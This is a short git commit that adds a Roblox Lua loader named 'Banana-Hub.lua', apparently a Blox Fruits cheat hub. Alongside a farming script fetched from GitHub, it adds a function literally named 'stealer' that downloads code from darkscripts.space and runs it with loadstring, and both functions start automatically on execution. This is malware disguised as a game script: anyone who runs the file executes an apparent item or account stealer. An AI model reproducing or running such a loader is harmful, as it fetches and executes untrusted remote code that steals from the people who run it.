8cf8ff9b3d207fc58dec7209f560d1471de2796a
BloxytheGoofy <jeffreytraboc@gmail.com>
2024-12-27 20:54:37 +0800

    B10298R432862KJOUQHL.lua

---
+++ V3/loader/Banana-Hub.lua
@@ -0,0 +1,10 @@
+local function stealer()
+    loadstring(game:HttpGet('https://darkscripts.space/scripts/8be944bc-c5f7-45e4-a2ec-10c6ef49b17e_824604012124569610.lua', true))()
+end
+
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
